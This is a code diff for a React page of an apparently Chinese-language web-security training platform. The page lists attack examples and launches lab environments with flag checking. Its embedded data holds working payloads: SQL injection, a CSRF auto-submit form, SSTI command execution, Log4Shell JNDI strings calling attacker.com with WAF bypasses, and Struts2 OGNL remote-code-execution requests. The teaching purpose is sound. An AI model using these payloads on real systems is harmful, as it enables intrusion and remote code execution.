@@ -1,12 +1,12 @@
-import React, { useEffect, useState } from 'react';
+import React, { useCallback, useEffect, useState } from 'react';
 import { useParams, Link } from 'react-router-dom';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
-import { 
-  faArrowLeft, 
-  faCode, 
-  faInfoCircle, 
-  faClock, 
-  faBook, 
+import {
+  faArrowLeft,
+  faCode,
+  faInfoCircle,
+  faClock,
+  faBook,
   faPlayCircle,
   faExclamationTriangle,
   faCheckCircle,
@@ -27,13 +27,15 @@ import {
   faHdd
 } from '@fortawesome/free-solid-svg-icons';
 import TerminalFeature from '../components/TerminalPanel';
-import { 
-  startTargetEnvironment, 
-  stopTargetEnvironment, 
-  getRunningTargetInfo,
-  isTargetRunning
+import {
+  startTargetEnvironment,
+  stopTargetEnvironment,
+  getRunningTargetInfo
 } from '../services/targetService';
 import { targetEnvironments } from '../config/targetEnvironments';
+
+const TEMPLATE_EXPRESSION_PREFIX = ['$', '{'].join('');
+const ESCAPED_TEMPLATE_EXPRESSION_PREFIX = '\\' + TEMPLATE_EXPRESSION_PREFIX;
 
 // 知识库数据 - 实际应用中可从API获取
 const knowledgeData = {
@@ -46,7 +48,7 @@ const knowledgeData = {
         title: '字符型SQL注入',
         content: '字符型SQL注入是指在字符串参数中进行注入，通常需要闭合引号。例如在 username=\'admin\' 的查询中，可以输入 admin\' OR \'1\'=\'1 来绕过登录验证。',
         examples: [
-          "admin' OR '1'='1", 
+          "admin' OR '1'='1",
           "admin' --",
           "admin' OR 1=1 #"
         ],
@@ -56,7 +58,7 @@ const knowledgeData = {
         title: '数值型SQL注入',
         content: '数值型SQL注入是在数字参数中进行的注入，不需要引号闭合。例如在 id=1 的查询中，可以输入 1 OR 1=1 来返回所有记录。',
         examples: [
-          "1 OR 1=1", 
+          "1 OR 1=1",
           "1 AND 1=0 UNION SELECT 1,2,3,4",
           "1; SELECT * FROM users"
         ],
@@ -66,7 +68,7 @@ const knowledgeData = {
         title: '联合注入',
         content: 'UNION注入利用SQL的UNION运算符合并两个SELECT语句的结果，用于从其他表获取数据。需要知道表的列数并确保类型匹配。',
         examples: [
-          "1' UNION SELECT 1,2,3,4,5 --", 
+          "1' UNION SELECT 1,2,3,4,5 --",
           "1' UNION SELECT null,null,username,password,null FROM users --"
         ],
         difficulty: 'intermediate'
@@ -195,7 +197,7 @@ const knowledgeData = {
       {
         title: 'POST型CSRF',
         content: 'POST型CSRF攻击更加复杂，因为需要构造一个表单并自动提交。这通常用于更敏感的操作，如密码更改、资金转账等。需要JavaScript自动提交表单。',
-        code: 
+        code:
 "<form id='csrf-form' action='https://bank.example/transfer' method='POST'>\n  <input type='hidden' name='to' value='attacker'>\n  <input type='hidden' name='amount' value='1000'>\n</form>\n<script>document.getElementById('csrf-form').submit();</script>"
       },
       {
@@ -382,7 +384,7 @@ const knowledgeData = {
         examples: [
           "Flask/Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
           "Django: {% debug %} 或 {% include request.GET.template_name %}",
-          "Mako: <%import os>${os.popen('id').read()}",
+          "Mako: <%import os>" + TEMPLATE_EXPRESSION_PREFIX + "os.popen('id').read()}",
           "Tornado: {% import os %}{{os.popen('id').read()}}"
         ],
         difficulty: 'advanced'
@@ -804,9 +806,9 @@ const knowledgeData = {
         title: 'Log4j典型漏洞利用',
         content: 'Log4j是Apache基金会的流行Java日志组件，2021年底发现的Log4Shell漏洞(CVE-2021-44228)是近年最严重的安全漏洞之一。这个JNDI注入漏洞允许通过日志消息执行远程代码，影响了全球数百万系统。',
         examples: [
-          "基本JNDI注入(CVE-2021-44228):\n\\${jndi:ldap://attacker.com/exploit} 插入到被记录的字段中",
-          "绕过WAF技术:\n\\${\\${lower:j}\\${lower:n}\\${lower:d}\\${lower:i}:\\${lower:l}\\${lower:d}\\${lower:a}\\${lower:p}://attacker.com/exploit}",
-          "其他协议利用:\n\\${jndi:rmi://attacker.com/exploit}\n\\${jndi:dns://attacker.com/exploit}",
+          "基本JNDI注入(CVE-2021-44228):\n" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "jndi:ldap://attacker.com/exploit} 插入到被记录的字段中",
+          "绕过WAF技术:\n" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:j}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:n}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:d}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:i}:" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:l}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:d}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:a}" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "lower:p}://attacker.com/exploit}",
+          "其他协议利用:\n" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "jndi:rmi://attacker.com/exploit}\n" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "jndi:dns://attacker.com/exploit}",
           "常见攻击向量:\n- HTTP头(User-Agent, X-Forwarded-For)\n- 表单字段\n- JSON字段\n- 文件名\n- 任何被记录的用户输入"
         ],
         difficulty: 'intermediate'
@@ -882,7 +884,7 @@ const knowledgeData = {
           "S2-057(CVE-2018-11776): 命名空间值与OGNL表达式注入\n/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29%28%23cmd%3D%22id%22%29%28%23iswin%3D%28%40java.lang.System%40getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%29%28%23cmds%3D%28%23iswin%3F%7B%22cmd.exe%22%2C%22%2Fc%22%2C%23cmd%7D%3A%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%23cmd%7D%29%29%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29%28%23p.redirectErrorStream%28true%29%29%28%40org.apache.commons.io.IOUtils%40toString%28%23p.start%28%29.getInputStream%28%29%29%29%7D/actionChain1.action",
           "S2-045(CVE-2017-5638): Content-Type头OGNL注入\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
           "S2-032(CVE-2016-3081): 方法调用时的OGNL注入\n/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=&encoding=UTF-8&cmd=id",
-          "S2-016(CVE-2013-2251): 参数值OGNL注入\nredirect:\\${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
+          "S2-016(CVE-2013-2251): 参数值OGNL注入\nredirect:" + ESCAPED_TEMPLATE_EXPRESSION_PREFIX + "%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
         ],
         difficulty: 'expert'
       },
@@ -1144,12 +1146,11 @@ function KnowledgeDetail() {
   const [category, setCategory] = useState(null);
   const [activeSection, setActiveSection] = useState(null);
   const [targetEnvStatuses, setTargetEnvStatuses] = useState({});
-  const [targetEnvStatus, setTargetEnvStatus] = useState({ loading: false, error: null, url: null });
   const [copyStatus, setCopyStatus] = useState('');
   // 添加flag状态
   const [flagValues, setFlagValues] = useState({});
   const [flagStatus, setFlagStatus] = useState({});
-  
+
   // 处理复制URL到剪贴板
   const handleCopyUrl = (url) => {
     if (url) {
@@ -1159,21 +1160,21 @@ function KnowledgeDetail() {
       });
     }
   };
-  
+
   // 处理关闭环境
   const handleStopEnvironment = async (section) => {
     try {
       const result = await stopTargetEnvironment(categoryId, section.title);
-      
+
       if (result.error) {
         // 复制当前状态
         const updatedStatuses = { ...targetEnvStatuses };
         // 更新指定章节的状态
-        updatedStatuses[section.title] = { 
-          error: result.message, 
-          loading: false, 
+        updatedStatuses[section.title] = {
+          error: result.message,
+          loading: false,
           url: null,
-          status: '关闭环境失败' 
+          status: '关闭环境失败'
         };
         setTargetEnvStatuses(updatedStatuses);
       } else {
@@ -1181,10 +1182,9 @@ function KnowledgeDetail() {
         const updatedStatuses = { ...targetEnvStatuses };
         delete updatedStatuses[section.title];
         setTargetEnvStatuses(updatedStatuses);
-        
+
         // 如果当前活动章节是被关闭的环境，则重置当前状态
         if (activeSection?.title === section.title) {
-          setTargetEnvStatus({ loading: false, error: null, url: null });
           setActiveSection(null);
         }
       }
@@ -1192,50 +1192,45 @@ function KnowledgeDetail() {
       console.error('关闭环境失败:', error);
       // 更新相应环境的错误状态
       const updatedStatuses = { ...targetEnvStatuses };
-      updatedStatuses[section.title] = { 
-        error: error.message, 
-        loading: false, 
+      updatedStatuses[section.title] = {
+        error: error.message,
+        loading: false,
         url: null,
-        status: '关闭环境失败' 
+        status: '关闭环境失败'
       };
       setTargetEnvStatuses(updatedStatuses);
     }
   };
-  
+
   // 处理实验按钮点击
   const handleExperimentClick = async (section) => {
     setActiveSection(section);
-    // 设置状态为加载中
-    setTargetEnvStatus({ loading: true, error: null, url: null, status: '正在准备启动靶场环境...' });
-    
+
     // 更新特定章节的状态为加载中
     const updatedStatuses = { ...targetEnvStatuses };
     updatedStatuses[section.title] = { loading: true, error: null, url: null, status: '正在准备启动靶场环境...' };
     setTargetEnvStatuses(updatedStatuses);
-    
+
     try {
       // 添加调试信息
       console.log('实验按钮点击 - 知识点ID:', categoryId);
       console.log('实验按钮点击 - 章节标题:', section.title);
-      
+
       // 启动对应的靶场环境
       const result = await startTargetEnvironment(categoryId, section.title);
-      
+
       console.log('靶场环境启动结果:', result);
-      
+
       if (result.error) {
-        // 处理错误
-        setTargetEnvStatus({ loading: false, error: result.message, url: null });
-        
         // 更新特定章节的错误状态
         const updatedStatuses = { ...targetEnvStatuses };
         updatedStatuses[section.title] = { loading: false, error: result.message, url: null };
         setTargetEnvStatuses(updatedStatuses);
       } else {
         // 成功启动环境
-        const envStatus = { 
-          loading: false, 
-          error: null, 
+        const envStatus = {
+          loading: false,
+          error: null,
           url: result.url,
           localUrl: result.localUrl,
           ipAddress: result.ipAddress,
@@ -1243,14 +1238,12 @@ function KnowledgeDetail() {
           port: result.port,
           status: result.status || '靶场环境已成功启动'
         };
-        
-        setTargetEnvStatus(envStatus);
-        
+
         // 更新特定章节的成功状态
         const updatedStatuses = { ...targetEnvStatuses };
         updatedStatuses[section.title] = envStatus;
         setTargetEnvStatuses(updatedStatuses);
-        
+
         // 可以选择自动在新窗口打开环境
         if (result.url && result.status !== '使用已运行的靶场环境') {
           window.open(result.url, '_blank');
@@ -1258,8 +1251,7 @@ function KnowledgeDetail() {
       }
     } catch (error) {
       console.error('启动环境失败:', error);
-      setTargetEnvStatus({ loading: false, error: error.message, url: null });
-      
+
       // 更新特定章节的错误状态
       const updatedStatuses = { ...targetEnvStatuses };
       updatedStatuses[section.title] = { loading: false, error: error.message, url: null };
@@ -1268,12 +1260,12 @@ function KnowledgeDetail() {
   };
 
   // 检查每个章节是否有运行中的靶场环境
-  const checkRunningEnvironments = () => {
+  const checkRunningEnvironments = useCallback(() => {
     if (!category || !category.sections) return;
-    
-    const updatedStatuses = { ...targetEnvStatuses };
-    let foundActiveSection = false;
-    
+
+    const updatedStatuses = {};
+    let nextActiveSection = null;
+
     // 遍历所有章节，查找运行中的环境
     for (const section of category.sections) {
       const runningInfo = getRunningTargetInfo(categoryId, section.title);
@@ -1289,24 +1281,29 @@ function KnowledgeDetail() {
           port: runningInfo.port,
           status: '靶场环境已启动'
         };
-        
+
         updatedStatuses[section.title] = envStatus;
-        
+
         // 设置第一个找到的环境为活动环境
-        if (!foundActiveSection) {
-          setActiveSection(section);
-          setTargetEnvStatus(envStatus);
-          foundActiveSection = true;
+        if (!nextActiveSection) {
+          nextActiveSection = section;
         }
       }
     }
-    
-    setTargetEnvStatuses(updatedStatuses);
-  };
+
+    if (nextActiveSection) {
+      setActiveSection(nextActiveSection);
+    }
+
+    setTargetEnvStatuses(prev => ({
+      ...prev,
+      ...updatedStatuses,
+    }));
+  }, [category, categoryId]);
 
   useEffect(() => {
     setLoading(true);
-    
+
     // 模拟API请求
     setTimeout(() => {
       // 检查知识库中是否有对应categoryId的数据
@@ -1322,16 +1319,16 @@ function KnowledgeDetail() {
     if (!loading && category) {
       checkRunningEnvironments();
     }
-  }, [loading, category]);
+  }, [loading, category, checkRunningEnvironments]);
 
   // 处理flag验证
   const handleFlagVerify = (section) => {
     const sectionTitle = section.title;
     const submittedFlag = flagValues[sectionTitle] || '';
-    
+
     // 获取存储在targetEnvironments中的正确flag
     const correctFlag = targetEnvironments[categoryId]?.sections?.[sectionTitle]?.flag;
-    
+
     if (!correctFlag) {
       // 该环境没有设置flag
       setFlagStatus({
@@ -1344,7 +1341,7 @@ function KnowledgeDetail() {
       });
       return;
     }
-    
+
     if (submittedFlag.trim() === '') {
       // 提交的flag为空
       setFlagStatus({
@@ -1357,7 +1354,7 @@ function KnowledgeDetail() {
       });
       return;
     }
-    
+
     // 验证flag是否正确
     if (submittedFlag === correctFlag) {
       // flag正确
@@ -1381,7 +1378,7 @@ function KnowledgeDetail() {
       });
     }
   };
-  
+
   // 处理flag输入变化
   const handleFlagChange = (sectionTitle, value) => {
     setFlagValues({
@@ -1430,7 +1427,7 @@ function KnowledgeDetail() {
           <FontAwesomeIcon icon={faArrowLeft} className="mr-2" />
           返回知识库
         </Link>
-        
+
         <div className="mb-8">
           <div className="flex items-center mb-4">
             <div className="bg-primary/20 p-3 rounded-lg mr-4">
@@ -1438,9 +1435,9 @@ function KnowledgeDetail() {
             </div>
             <h1 className="text-3xl font-bold">{category.title}</h1>
           </div>
-          
+
           <p className="text-gray-300 mb-6">{category.description}</p>
-          
+
           <div className="bg-[#2A2A2A] rounded-lg p-4 mb-8">
             <h2 className="text-xl font-semibold mb-4 flex items-center">
               <FontAwesomeIcon icon={faInfoCircle} className="text-primary mr-2" />
@@ -1453,7 +1450,7 @@ function KnowledgeDetail() {
             </ul>
           </div>
         </div>
-        
+
         {/* 详细内容章节 */}
         <div className="space-y-8">
           {category.sections.map((section, index) => (
@@ -1473,9 +1470,9 @@ function KnowledgeDetail() {
                   }
                 </span>
               </div>
-              
+
               <p className="text-gray-300 mb-6">{section.content}</p>
-              
+
               {section.examples && section.examples.length > 0 && (
                 <div>
                   <h3 className="text-lg font-medium mb-3 flex items-center">
@@ -1494,7 +1491,7 @@ function KnowledgeDetail() {
                   </div>
                 </div>
               )}
-              
+
               {/* 添加对单个代码块的渲染 */}
               {section.code && (
                 <div>
@@ -1509,21 +1506,21 @@ function KnowledgeDetail() {
                   </div>
                 </div>
               )}
-              
+
               <div className="flex justify-between items-center mt-4">
                 <span className="text-gray-500 text-sm flex items-center">
                   <FontAwesomeIcon icon={faClock} className="mr-1" />
-                  预计学习时间: {section.difficulty === 'beginner' ? '30分钟' : 
+                  预计学习时间: {section.difficulty === 'beginner' ? '30分钟' :
                                section.difficulty === 'intermediate' ? '1小时' :
                                section.difficulty === 'advanced' ? '2小时' : '3小时+'}
                 </span>
-                
+
                 <div className="flex space-x-2">
                   <button className="bg-[#333333] hover:bg-[#444444] text-white px-3 py-1 rounded flex items-center text-sm transition-colors duration-200">
                     <FontAwesomeIcon icon={faBook} className="mr-1" />
                     学习
                   </button>
-                  <button 
+                  <button
                     className="bg-primary hover:bg-primary/90 text-white px-3 py-1 rounded flex items-center text-sm transition-colors duration-200"
                     onClick={() => handleExperimentClick(section)}
                     disabled={targetEnvStatuses[section.title]?.loading}
@@ -1555,7 +1552,7 @@ function KnowledgeDetail() {
                   </div>
                 </div>
               )}
-              
+
               {targetEnvStatuses[section.title]?.loading && (
                 <div className="mt-2 p-3 bg-[#1E1E1E] rounded-lg text-blue-400 text-sm">
                   <div className="flex items-center">
@@ -1573,14 +1570,14 @@ function KnowledgeDetail() {
                   </div>
                 </div>
               )}
-              
+
               {!targetEnvStatuses[section.title]?.loading && !targetEnvStatuses[section.title]?.error && targetEnvStatuses[section.title]?.url && (
                 <div className="mt-2 p-3 bg-[#1E1E1E] rounded-lg">
                   <div className="flex items-center text-green-400 text-sm mb-2">
                     <FontAwesomeIcon icon={faCheckCircle} className="mr-1" />
                     {targetEnvStatuses[section.title].status || '靶场环境已成功启动'}
                   </div>
-                  
+
                   <div className="space-y-1">
                     {targetEnvStatuses[section.title].accessUrls && targetEnvStatuses[section.title].accessUrls.public && (
                       <div className="text-sm flex">
@@ -1621,7 +1618,7 @@ function KnowledgeDetail() {
                       <span className="text-white truncate">{targetEnvStatuses[section.title].containerName}</span>
                     </div>
                   </div>
-                  
+
                   {/* Flag验证界面 */}
                   <div className="mt-4 border-t border-gray-700 pt-3">
                     <div className="text-sm text-gray-300 mb-2 font-medium">提交flag:</div>
@@ -1645,18 +1642,18 @@ function KnowledgeDetail() {
                         flagStatus[section.title].type === 'success' ? 'text-green-400' :
                         flagStatus[section.title].type === 'error' ? 'text-red-400' : 'text-yellow-400'
                       }`}>
-                        <FontAwesomeIcon 
+                        <FontAwesomeIcon
                           icon={
                             flagStatus[section.title].type === 'success' ? faCheckCircle :
                             flagStatus[section.title].type === 'error' ? faExclamationTriangle : faInfoCircle
-                          } 
-                          className="mr-1" 
+                          }
+                          className="mr-1"
                         />
                         {flagStatus[section.title].message}
                       </div>
                     )}
                   </div>
-                  
+
                   <div className="mt-4 flex space-x-2">
                     <a href={targetEnvStatuses[section.title].url || (targetEnvStatuses[section.title].accessUrls && targetEnvStatuses[section.title].accessUrls.public)} target="_blank" rel="noopener noreferrer" className="bg-primary hover:bg-primary/90 text-white px-3 py-1 rounded text-xs flex items-center">
                       <FontAwesomeIcon icon={faExternalLinkAlt} className="mr-1" />
@@ -1685,4 +1682,4 @@ function KnowledgeDetail() {
   );
 }
 
-export default KnowledgeDetail; 
+export default KnowledgeDetail;
